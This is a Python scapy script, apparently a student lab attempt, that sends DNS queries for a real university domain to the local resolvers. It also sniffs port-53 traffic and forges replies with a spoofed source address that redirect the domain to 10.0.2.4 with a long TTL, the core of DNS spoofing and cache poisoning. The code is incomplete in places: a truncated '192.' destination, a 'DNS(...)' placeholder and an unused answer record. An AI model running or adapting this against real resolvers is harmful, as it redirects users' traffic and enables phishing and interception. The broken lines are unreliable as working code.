#!/usr/bin/env python3
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff
from scapy.all import *
import threading
import platform
import re
import subprocess

def get_dns_servers():
    dns_servers = []
    if platform.system() == 'Windows':
        output = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
        dns_servers = re.findall(r'DNS Servers[\s\S]*?: ([\d\.]+)', output)
    elif platform.system() == 'Linux':
        with open('/etc/resolv.conf', 'r') as file:
            for line in file:
                if line.startswith('nameserver'):
                    dns_servers.append(line.split()[1])
    elif platform.system() == 'Darwin':  # macOS
        output = subprocess.check_output(['scutil', '--dns']).decode('utf-8')
        dns_servers = re.findall(r'nameserver\[\d+\]\s*: ([\d\.]+)', output)

    return dns_servers

_LOCAL_DNS_SERVER = get_dns_servers()

if _LOCAL_DNS_SERVER:
    print("DNS Servers:")
    for server in _LOCAL_DNS_SERVER:
        print(server)
else:
    print("No DNS servers found.")

_TARGET_DOMAIN = 'myhwu.hw.ac.uk'
dns_request = IP(dst=_LOCAL_DNS_SERVER) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=_TARGET_DOMAIN))

def send_dns_requests():
    for i in range(10):  # Adjust the number of requests as needed
        send(dns_request)
        print("Sent DNS request:", i)

def spoof_dns(pkt):
    #print("Received packet:", pkt.summary())
    if (DNS in pkt and _TARGET_DOMAIN in pkt[DNS].qd.qname.decode('utf-8')):
      print(pkt.sprintf("{DNS: %IP.src%--> %IP.dst%: %DNS.id%}"))
      ip = IP(src='137.195.101.250',dst='192.')
      udp = UDP(dport=53)
      Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.4')
      dns = DNS(...)
      # Create a DNS object
      spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
      send(spoofpkt)

def sniff_pkt():
  # Start sniffing packets in the main thread
  sniff(iface='eth0', filter='udp and dst port 53', prn=spoof_dns)

# Start a thread for sniffing DNS requests
sniff_thread = threading.Thread(target=sniff_pkt)
sniff_thread.start()

send_dns_requests()
# dns_response = IP(dst=_LOCAL_DNS_SERVER) / UDP(dport=53) / DNS(id=12345, qr=1, aa=1, an=DNSRR(rrname=_TARGET_DOMAIN, ttl=0))
